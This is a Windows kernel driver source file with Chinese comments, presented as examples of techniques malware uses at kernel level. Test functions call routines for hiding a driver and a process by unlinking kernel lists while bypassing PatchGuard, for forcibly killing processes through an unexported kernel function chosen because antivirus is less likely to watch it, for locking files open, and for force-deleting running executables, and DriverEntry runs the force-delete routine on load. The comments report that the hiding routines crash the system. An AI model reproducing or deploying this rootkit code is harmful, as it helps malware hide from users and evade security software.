
/**
 * 恶意程序在内核层常用技术示例
 * 包括驱动隐藏、进程隐藏、更底层的TDI和NDIS等网络通信
 * 还有文件保护、进程保护、进程强杀、文件强删
 */

#include "ForceKillProcess.h" //强杀进程

 /**
  * 过PatchGuard驱动隐藏
  * 通过对DRIVER_OBJECT结构体对对象进行操作是对驱动链进行摘链实现驱动隐藏
  * 需要绕过PatchGuard，基于MiProcessLoaderEntry实现
  * PatchGuard根据监控系统上的一些全局数据来判断关键内存是否被更改
  * 而Mi这个函数在插入或摘除一个链表模块时，同时会设置PG监控的全局数据，这样就不会触发PG而导致蓝屏
  *
  * 这个例子会蓝屏  system thread exception not handled
  * 查了下dmp蓝屏日志，警告信息： Unable to load image \SystemRoot\system32\ntoskrnl.exe , Win32 error 0n2
  */
#include "EnumDriver.h"
VOID TESTDRIVERHIDE(PDRIVER_OBJECT pDriverObject)
{
	// 遍历驱动模块
	EnumDriver(pDriverObject);

	// 驱动模块隐藏(Bypass Patch Guard)
	UNICODE_STRING ustrDriverName;
	RtlInitUnicodeString(&ustrDriverName, L"MySYS.sys");
	HideDriver_Bypass_PatchGuard(pDriverObject, ustrDriverName);
}

/**
 * 过PG进程隐藏
 * 类似驱动隐藏
 * 通过遍历进程结构EPROCESS中的活动进程双向链表ActiveProcessLinks来实现摘链
 *
 * 也是一样的会蓝屏，估计绕过PG的方式过时了？暂时放一放
 */
#include "EnumProcess.h"
VOID TESTPROCESSHIDE()
{
	// 遍历进程
	EnumProcess();

	// 隐藏指定进程(Bypass Patch Guard)
	HideProcess_Bypass_PatchGuard("InstDrv.exe");
}

/**
 * TDI网络通信
 * 内容相对多一些，单开了一个项目：TDINetDriver
 */

 /**
  * 强制结束进程
  * 除了有ZwTerminateProcess内核函数和进程内存清零函数
  * 还可以使用PspTerminateThreadByPointer
  * 线程时进程中执行的最小单位，所以结束进程中的所有线程，进程也就没有意义，随之结束
  * Windows提供了PsTerminateSystemThread内核函数结束线程，但会成为杀软监控对象
  * 通过逆向该导出函数，发现其调用的是为到处的PspTerminateThreadByPointer，相对更底层些，不容易被监控
  */
  //#include "ForceKillProcess.h" 
VOID TESTSHUTPROCESS()
{
	// 强制结束指定进程
	ForceKillProcess((HANDLE)2848);
}

/**
 * 文件保护
 * 通过发送IRP信息打开文件并获取句柄，之后不关闭该句柄，则一直保持打开状态
 * 文件句柄没有释放，那么也不能删除文件，实现文件防删除
 *
 * 文件操作使用IRP，需要创建设备对象
 */
#include "FileProtect.h"
PFILE_OBJECT g_pFileObject = NULL;
VOID TESTPROTECTFILE()
{
	// 保护文件
	UNICODE_STRING ustrFileName;
	RtlInitUnicodeString(&ustrFileName, L"C:\\ChatServer.exe");
	g_pFileObject = ProtectFile(ustrFileName);
}

/**
 * 文件强删
 * 当PE文件已经加载到内存时，正常情况下是无法删除的
 * 因为删除运行的文件或者加载的DLL时，会调用MmFlushImageSection来检测文件是否运行
 * 原理主要是检查文件对象中的PSECTION_OBJECT_POINTERS结构数据来判断是否可以删除
 * 在发送IRP删除文件时，同样会判断文件属性是否只读，若是则会拒绝删除操作
 */
#include "ForceDelete.h"
VOID TESTFORCEDELFILE()
{
	UNICODE_STRING ustrFileName;
	RtlInitUnicodeString(&ustrFileName, L"C:\\ChatServer.exe");
	ForceDeleteFile(ustrFileName);
}




#define DEV_NAME L"\\Device\\IRP_FILE_DEV_NAME"
#define SYM_NAME L"\\DosDevices\\IRP_FILE_SYM_NAME"
#define IOCTL_TEST CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	DbgPrint("Enter DriverUnload\n");

	// 关闭保护文件
	//if (g_pFileObject)
	//{
	//	UnprotectFile(g_pFileObject);
	//}

	if (pDriverObject->DeviceObject)
	{
		IoDeleteDevice(pDriverObject->DeviceObject);
	}
	UNICODE_STRING ustrSymName;
	RtlInitUnicodeString(&ustrSymName, SYM_NAME);
	IoDeleteSymbolicLink(&ustrSymName);

	DbgPrint("Leave DriverUnload\n");
}

NTSTATUS DriverControlHandle(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	DbgPrint("Enter DriverControlHandle\n");
	NTSTATUS status = STATUS_SUCCESS;
	PIO_STACK_LOCATION pIoStackLocation = IoGetCurrentIrpStackLocation(pIrp);
	ULONG ulInputLen = pIoStackLocation->Parameters.DeviceIoControl.InputBufferLength;
	ULONG ulOutputLen = pIoStackLocation->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG ulControlCode = pIoStackLocation->Parameters.DeviceIoControl.IoControlCode;
	PVOID pBuffer = pIrp->AssociatedIrp.SystemBuffer;
	ULONG ulInfo = 0;

	switch (ulControlCode)
	{
	case IOCTL_TEST:
	{
		break;
	}
	default:
		break;
	}

	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = ulInfo;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	DbgPrint("Leave DriverControlHandle\n");
	return status;
}

NTSTATUS CreateDevice(PDRIVER_OBJECT pDriverObject)
{
	DbgPrint("Enter CreateDevice\n");
	NTSTATUS status = STATUS_SUCCESS;
	PDEVICE_OBJECT pDevObj = NULL;
	UNICODE_STRING ustrDevName, ustrSymName;
	RtlInitUnicodeString(&ustrDevName, DEV_NAME);
	RtlInitUnicodeString(&ustrSymName, SYM_NAME);

	status = IoCreateDevice(pDriverObject, 0, &ustrDevName, FILE_DEVICE_UNKNOWN, 0, FALSE, &pDevObj);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("IoCreateDevice Error[0x%X]\n", status);
		return status;
	}

	status = IoCreateSymbolicLink(&ustrSymName, &ustrDevName);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("IoCreateSymbolicLink Error[0x%X]\n", status);
		return status;
	}

	DbgPrint("Leave CreateDevice\n");
	return status;
}


NTSTATUS DriverDefaultHandle(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	NTSTATUS status = STATUS_SUCCESS;
	pIrp->IoStatus.Status = status;
	pIrp->IoStatus.Information = 0;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return status;
}

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT pDriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	DbgPrint("Enter CreateDevice\n");
	NTSTATUS status = STATUS_SUCCESS;
	pDriverObject->DriverUnload = DriverUnload;
	pDriverObject->MajorFunction[IRP_MJ_CREATE] = DriverDefaultHandle;
	pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DriverDefaultHandle;
	pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverControlHandle;

	status = CreateDevice(pDriverObject);

	//隐藏驱动
	//TESTDRIVERHIDE(pDriverObject);
	//隐藏进程
	//TESTPROCESSHIDE();

	//文件保护
	//TESTPROTECTFILE();
	//文件强删
	TESTFORCEDELFILE();

	DbgPrint("Leave CreateDevice\n");
	return status;
}